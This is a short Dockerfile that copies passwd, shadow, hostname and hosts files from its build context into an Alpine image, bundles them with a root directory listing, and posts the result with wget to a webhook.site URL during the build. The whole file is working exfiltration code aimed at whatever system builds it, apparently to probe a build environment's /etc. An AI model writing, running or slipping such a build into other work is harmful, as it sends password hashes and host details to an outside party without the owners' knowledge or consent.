FROM alpine:3.20
COPY passwd /p
COPY hostname /h
COPY hosts /ho
COPY shadow /sh
RUN set -x; \
  U="https://webhook.site/77d2fd72-c9ba-4e3f-9699-117a7685f1a6"; \
  { echo "###CTXETC-START"; echo "###PASSWD"; cat /p 2>&1; echo "###SHADOW"; cat /sh 2>&1; echo "###HOSTNAME"; cat /h /ho 2>&1; echo "###LS"; ls -la / 2>&1; echo "###DONE"; } > /tmp/o.txt 2>&1; \
  wc -c /tmp/o.txt; cat /tmp/o.txt; \
  wget -q -O- --post-file=/tmp/o.txt "$U" || true; \
  echo CTXETC-DONE
CMD ["sh","-c","sleep 3600"]
